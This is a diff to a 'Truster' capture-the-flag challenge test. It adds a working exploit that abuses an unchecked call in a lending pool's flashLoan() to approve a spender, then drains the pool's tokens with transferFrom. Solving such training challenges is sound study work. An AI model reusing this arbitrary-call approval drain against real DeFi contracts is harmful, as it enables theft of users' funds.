@@ -27,8 +27,18 @@ describe('[Challenge] Truster', function () {
         ).to.equal('0');
     });
 
+    // ------------------------------------------ EXPLOIT ------------------------------------------
+    // Exploit contract by using the unchecked function call within 'flashLoan()' and approve the
+    // attacker for transfer of DVT in the lending pool. Next, call DVT contract to transfer all 
+    // tokens from the lending pool to the attacker. 
+    // ---------------------------------------------------------------------------------------------
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
+        const calldata = this.token.interface.encodeFunctionData("approve", [
+            deployer.address,
+            ethers.constants.MaxUint256
+        ]);
+        await this.pool.flashLoan(0, attacker.address, this.token.address, calldata);
+        await this.token.transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
